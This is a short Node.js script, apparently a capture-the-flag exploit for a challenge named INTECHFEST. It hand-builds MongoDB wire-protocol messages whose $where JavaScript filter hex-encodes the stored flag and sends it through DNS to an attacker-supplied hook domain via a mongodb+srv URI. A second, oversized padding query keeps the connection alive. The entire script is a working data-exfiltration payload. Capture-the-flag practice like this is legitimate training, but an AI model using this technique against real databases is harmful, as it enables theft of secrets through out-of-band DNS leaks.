const BSON = require('bson')
const fs = require('fs')

const filename = process.argv[2]
const dnshook = process.argv[3]

const doc1 = {
    find: 'flag',
    $db: 'flagdb',
    filter: {
        $where: `this.flag.startsWith("INTECHFEST{")?MongoURI("mongodb+srv://"+this.flag.split('').map((char) => char.charCodeAt(0).toString(16)).join('')+".${dnshook}"):""`
    }
}
let header1 = Buffer.from('000000000000000000000000DD0700000000000000', 'hex')
let msg1 = Buffer.concat([header1, BSON.serialize(doc1)])

const doc2 = {
    // make a huge buffer so the connection din't sudenly closed
    find: "A".repeat(100000),
    $db: 'A',
}

let header2 = Buffer.from('000000000000000000000000DD0700000000000000', 'hex')
let msg2 = Buffer.concat([header2, BSON.serialize(doc2)])

msg1.writeUInt32LE(msg1.length, 0)
msg2.writeUInt32LE(msg2.length, 0)
const full = Buffer.concat([msg1, msg2])
fs.writeFileSync(filename, full)
